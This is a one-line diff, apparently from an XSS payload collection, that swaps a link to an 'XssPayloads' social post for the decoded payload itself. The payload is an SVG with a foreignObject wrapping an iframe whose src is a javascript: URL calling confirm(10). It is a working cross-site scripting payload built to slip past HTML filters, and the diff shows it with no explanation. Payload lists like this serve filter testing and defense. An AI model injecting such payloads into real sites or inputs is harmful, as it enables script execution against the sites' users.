@@ -1,1 +1,1 @@
-https://x.com/XssPayloads/status/1773945831952900587#:~:text=%3Csvg%3E%20%3CforeignObject%20width%3D%22100%25%22%20height%3D%22100%25%22%3E%20%20%20%20%20%3Cbody%3E%20%3Ciframe%20src%3D%27javascript%3Aconfirm(10)%27%3E%3C/iframe%3E%20%20%20%20%20%3C/body%3E%20%20%20%3C/foreignObject%3E%20%3C/svg%3E
+<svg> <foreignObject width="100%" height="100%">     <body> <iframe src='javascript:confirm(10)'></iframe>     </body>   </foreignObject> </svg>
